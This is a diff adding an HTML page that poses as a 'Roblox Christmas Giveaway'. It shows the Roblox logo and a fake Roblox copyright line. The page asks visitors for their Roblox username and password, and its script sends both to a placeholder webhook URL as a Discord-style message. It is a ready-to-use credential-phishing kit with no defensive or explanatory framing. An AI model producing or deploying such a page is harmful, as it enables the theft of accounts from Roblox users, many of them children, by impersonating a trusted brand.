@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Christmas Giveaway</title>
+    <link href="https://cdn.jsdelivr.net/npm/daisyui@3.5.1/dist/full.css" rel="stylesheet" type="text/css" />
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@latest/dist/tailwind.min.css" rel="stylesheet" type="text/css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaIpsC3K9mi9z4xUptyr548+3VM6ULae7TdUBD16t5nVtPX23x5bzAKHdQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #f0f0f0;
+            background-image: linear-gradient(to bottom, #ff0000, #00ff00);
+        }
+
+        .roblox-giveaway-container {
+            width: 90%;
+            margin: 50px auto;
+            padding: 20px;
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .roblox-giveaway-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .roblox-giveaway-header img {
+            width: 150px;
+            height: 150px;
+            margin: 20px auto;
+        }
+
+        .roblox-giveaway-form {
+            margin-bottom: 20px;
+        }
+
+        .roblox-giveaway-form input[type="text"], .roblox-giveaway-form input[type="password"] {
+            width: 100%;
+            height: 40px;
+            margin-bottom: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .roblox-giveaway-form input[type="submit"] {
+            width: 100%;
+            height: 40px;
+            background: #007bff;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .roblox-giveaway-form input[type="submit"]:hover {
+            background: #0069d9;
+        }
+
+        .roblox-giveaway-footer {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .roblox-giveaway-footer a {
+            color: #337ab7;
+            text-decoration: none;
+        }
+
+        .roblox-giveaway-footer a:hover {
+            color: #23527c;
+        }
+
+        @media only screen and (max-width: 768px) {
+            .roblox-giveaway-container {
+                width: 90%;
+                margin: 20px auto;
+            }
+        }
+
+        .snowflake {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 10px;
+            height: 10px;
+            background-color: #fff;
+            border-radius: 50%;
+            animation: snowflake 5s linear infinite;
+        }
+
+        @keyframes snowflake {
+            0% {
+                transform: translate(0, 0);
+            }
+            100% {
+                transform: translate(0, 100vh);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="roblox-giveaway-container">
+        <div class="roblox-giveaway-header">
+            <img src="https://www.roblox.com/images/logo-120x120.png" alt="Roblox Logo">
+            <h2 style="color: #ff0000;">Roblox Christmas Giveaway</h2>
+            <p style="color: #00ff00;">Enter to win a FREE Roblox account, plus a chance to win a $100 Roblox gift card!</p>
+        </div>
+        <form class="roblox-giveaway-form" action="" method="post">
+            <input type="text" name="username" placeholder="Username">
+            <input type="password" name="password" placeholder="Password">
+            <input type="submit" value="Enter Giveaway">
+        </form>
+        <div class="roblox-giveaway-footer">
+            <a href="#">Terms and Conditions</a>
+            <br>
+            <a href="#">Privacy Policy</a>
+            <p style="color: #337ab7;">&copy; 2023 Roblox Corporation. All rights reserved.</p>
+        </div>
+    </div>
+    <script>
+        const webhookUrl = 'https://your-webhook.com/endpoint';
+        const form = document.querySelector('form');
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    embeds: [
+                        {
+                            title: 'New Entry',
+                            description: `Username: ${username}\nPassword: ${password}`,
+                            color: 0x00ff00,
+                            timestamp: new Date().toISOString(),
+                            footer: {
+                                text: 'Roblox Christmas Giveaway'
+                            }
+                        }
+                    ]
+                })
+            })
+            .then((response) => response.json())
+            .then((data) => {
+                console.log(data);
+            })
+            .catch((error) => {
+                console.error(error);
+            });
+        });
+
+        for (let i = 0; i < 100; i++) {
+            const snowflake = document.createElement('div');
+            snowflake.classList.add('snowflake');
+            snowflake.style.left = `${Math.random() * 100}%`;
+            snowflake.style.animationDelay = `${Math.random() * 5}s`;
+            document.body.appendChild(snowflake);
+        }
+    </script>
+</body>
+</html>
